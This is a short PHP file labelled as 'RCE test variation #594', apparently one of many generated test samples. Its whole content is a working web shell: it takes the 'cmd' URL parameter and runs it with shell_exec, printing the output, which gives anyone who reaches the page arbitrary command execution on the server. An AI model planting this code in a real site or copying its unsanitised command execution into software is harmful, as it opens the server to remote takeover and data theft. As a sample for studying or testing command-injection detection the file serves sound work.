<?php
// RCE test variation #594
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>